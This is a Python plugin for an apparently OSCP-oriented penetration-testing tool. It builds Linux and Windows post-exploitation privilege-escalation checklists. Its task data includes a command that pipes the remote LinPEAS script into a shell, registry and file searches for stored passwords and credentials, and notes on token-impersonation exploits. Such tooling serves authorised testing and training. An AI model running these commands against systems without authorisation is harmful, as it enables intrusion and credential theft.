"""
Post-exploitation enumeration plugin

Activated when user obtains shell access.
Generates tasks for privilege escalation and system enumeration.
"""

from typing import Dict, Any, List
from .base import ServicePlugin
from .registry import ServiceRegistry


@ServiceRegistry.register
class PostExploitPlugin(ServicePlugin):
    """Post-exploitation enumeration plugin"""

    @property
    def name(self) -> str:
        return "post-exploit"

    def detect(self, port_info: Dict[str, Any]) -> bool:
        # This plugin is manually triggered, not auto-detected
        return False

    def get_task_tree(self, target: str, port: int, service_info: Dict[str, Any]) -> Dict[str, Any]:
        """Generate post-exploitation enumeration tasks

        service_info should contain 'os_type': 'linux' or 'windows'
        """
        os_type = service_info.get('os_type', 'linux').lower()

        if os_type == 'linux':
            return self._get_linux_tasks(target)
        elif os_type == 'windows':
            return self._get_windows_tasks(target)
        else:
            return self._get_generic_tasks(target)

    def _get_linux_tasks(self, target: str) -> Dict[str, Any]:
        """Linux privilege escalation enumeration"""
        return {
            'id': 'post-exploit-linux',
            'name': 'Linux Post-Exploitation Enumeration',
            'type': 'parent',
            'children': [
                {
                    'id': 'linux-suid',
                    'name': 'Find SUID Binaries',
                    'type': 'command',
                    'metadata': {
                        'command': 'find / -perm -u=s -type f 2>/dev/null',
                        'description': 'Find SUID binaries (potential privesc)',
                        'tags': ['OSCP:HIGH', 'QUICK_WIN', 'MANUAL'],
                        'flag_explanations': {
                            '-perm -u=s': 'Find files with SUID bit set',
                            '-type f': 'Only files (not directories)',
                            '2>/dev/null': 'Suppress permission denied errors'
                        },
                        'next_steps': [
                            'Check each binary against GTFOBins: https://gtfobins.github.io/',
                            'Look for unusual SUID binaries (not standard system binaries)',
                            'Test custom binaries for command injection'
                        ]
                    }
                },
                {
                    'id': 'linux-sudo',
                    'name': 'Check Sudo Permissions',
                    'type': 'command',
                    'metadata': {
                        'command': 'sudo -l',
                        'description': 'List allowed sudo commands for current user',
                        'tags': ['OSCP:HIGH', 'QUICK_WIN', 'MANUAL'],
                        'notes': [
                            'Look for NOPASSWD entries',
                            'Check GTFOBins for sudo escalation',
                            'Common wins: sudo vim, sudo find, sudo nmap --interactive'
                        ]
                    }
                },
                {
                    'id': 'linux-capabilities',
                    'name': 'Check File Capabilities',
                    'type': 'command',
                    'metadata': {
                        'command': 'getcap -r / 2>/dev/null',
                        'description': 'Find binaries with special capabilities',
                        'tags': ['OSCP:MEDIUM', 'MANUAL'],
                        'notes': [
                            'cap_setuid+ep allows setting UID to root',
                            'Check python, perl, tar with setuid capability'
                        ]
                    }
                },
                {
                    'id': 'linux-cron',
                    'name': 'Check Cron Jobs',
                    'type': 'manual',
                    'metadata': {
                        'description': 'Look for writable cron jobs or scripts',
                        'tags': ['OSCP:HIGH', 'MANUAL'],
                        'notes': [
                            'cat /etc/crontab',
                            'ls -la /etc/cron.*',
                            'Check user cron: crontab -l',
                            'Look for writable scripts executed by root'
                        ]
                    }
                },
                {
                    'id': 'linux-writable',
                    'name': 'Find World-Writable Files',
                    'type': 'command',
                    'metadata': {
                        'command': 'find / -writable -type f 2>/dev/null | grep -v proc',
                        'description': 'Find writable files (potential config/script modification)',
                        'tags': ['OSCP:MEDIUM', 'MANUAL']
                    }
                },
                {
                    'id': 'linux-kernel',
                    'name': 'Kernel Version Check',
                    'type': 'command',
                    'metadata': {
                        'command': 'uname -a',
                        'description': 'Get kernel version for exploit research',
                        'tags': ['OSCP:HIGH', 'RESEARCH'],
                        'notes': 'searchsploit linux kernel <version>'
                    }
                },
                {
                    'id': 'linux-network',
                    'name': 'Network Enumeration',
                    'type': 'manual',
                    'metadata': {
                        'description': 'Enumerate network connections and routes',
                        'tags': ['OSCP:MEDIUM', 'MANUAL'],
                        'notes': [
                            'netstat -antup # Active connections',
                            'ip addr # Network interfaces',
                            'ip route # Routing table',
                            'cat /etc/hosts # Known hosts'
                        ]
                    }
                },
                {
                    'id': 'linux-linpeas',
                    'name': 'LinPEAS Automated Enumeration',
                    'type': 'command',
                    'metadata': {
                        'command': 'curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh',
                        'description': 'Automated Linux privilege escalation enumeration',
                        'tags': ['AUTOMATED', 'OSCP:HIGH'],
                        'notes': 'Review output carefully - highlights potential vectors'
                    }
                }
            ]
        }

    def _get_windows_tasks(self, target: str) -> Dict[str, Any]:
        """Windows privilege escalation enumeration"""
        return {
            'id': 'post-exploit-windows',
            'name': 'Windows Post-Exploitation Enumeration',
            'type': 'parent',
            'children': [
                {
                    'id': 'win-sysinfo',
                    'name': 'System Information',
                    'type': 'command',
                    'metadata': {
                        'command': 'systeminfo',
                        'description': 'Get system info, hotfixes, and OS version',
                        'tags': ['OSCP:HIGH', 'QUICK_WIN', 'MANUAL'],
                        'notes': 'Check for missing patches, especially privilege escalation CVEs'
                    }
                },
                {
                    'id': 'win-whoami',
                    'name': 'Current User Privileges',
                    'type': 'command',
                    'metadata': {
                        'command': 'whoami /all',
                        'description': 'Get current user info, groups, and privileges',
                        'tags': ['OSCP:HIGH', 'QUICK_WIN', 'MANUAL'],
                        'notes': [
                            'Look for SeImpersonatePrivilege (Potato attacks)',
                            'Check group memberships (Administrators, Backup Operators, etc.)'
                        ]
                    }
                },
                {
                    'id': 'win-unquoted',
                    'name': 'Find Unquoted Service Paths',
                    'type': 'command',
                    'metadata': {
                        'command': 'wmic service get name,pathname,displayname,startmode | findstr /i auto | findstr /i /v "C:\\Windows\\\\" | findstr /i /v """',
                        'description': 'Find services with unquoted paths (potential hijack)',
                        'tags': ['OSCP:HIGH', 'MANUAL']
                    }
                },
                {
                    'id': 'win-services',
                    'name': 'Check Service Permissions',
                    'type': 'manual',
                    'metadata': {
                        'description': 'Look for writable service binaries or configs',
                        'tags': ['OSCP:HIGH', 'MANUAL'],
                        'notes': [
                            'accesschk.exe -uwcqv * # Check write access',
                            'icacls "C:\\Program Files\\<service>\\service.exe"',
                            'Look for (F)ull or (M)odify permissions'
                        ]
                    }
                },
                {
                    'id': 'win-autologon',
                    'name': 'Search for Credentials',
                    'type': 'manual',
                    'metadata': {
                        'description': 'Find stored credentials',
                        'tags': ['OSCP:HIGH', 'MANUAL', 'QUICK_WIN'],
                        'notes': [
                            'reg query HKLM /f password /t REG_SZ /s',
                            'reg query HKCU /f password /t REG_SZ /s',
                            'type C:\\unattend.xml',
                            'dir /s *pass* == *cred* == *vnc* == *.config*',
                            'cmdkey /list # Saved credentials'
                        ]
                    }
                },
                {
                    'id': 'win-tokens',
                    'name': 'Token Impersonation',
                    'type': 'manual',
                    'metadata': {
                        'description': 'Exploit token impersonation privileges',
                        'tags': ['EXPLOIT', 'OSCP:HIGH'],
                        'notes': [
                            'If SeImpersonatePrivilege enabled: use Potato exploit',
                            'JuicyPotato, RoguePotato, PrintSpoofer',
                            'Metasploit: incognito module'
                        ]
                    }
                },
                {
                    'id': 'win-winpeas',
                    'name': 'WinPEAS Automated Enumeration',
                    'type': 'command',
                    'metadata': {
                        'command': 'winpeas.exe',
                        'description': 'Automated Windows privilege escalation enumeration',
                        'tags': ['AUTOMATED', 'OSCP:HIGH'],
                        'notes': 'Download from: https://github.com/carlospolop/PEASS-ng/releases'
                    }
                }
            ]
        }

    def _get_generic_tasks(self, target: str) -> Dict[str, Any]:
        """Generic post-exploitation tasks"""
        return {
            'id': 'post-exploit-generic',
            'name': 'Post-Exploitation Enumeration',
            'type': 'parent',
            'children': [
                {
                    'id': 'generic-user-enum',
                    'name': 'User Enumeration',
                    'type': 'manual',
                    'metadata': {
                        'description': 'Identify current user and privileges',
                        'tags': ['MANUAL']
                    }
                },
                {
                    'id': 'generic-network',
                    'name': 'Network Enumeration',
                    'type': 'manual',
                    'metadata': {
                        'description': 'Identify network connections and interfaces',
                        'tags': ['MANUAL']
                    }
                }
            ]
        }

    def on_task_complete(self, task_id: str, result: str, target: str) -> List[Dict[str, Any]]:
        return []

    def get_manual_alternatives(self, task_id: str) -> List[str]:
        return ['Manual enumeration based on obtained shell type']
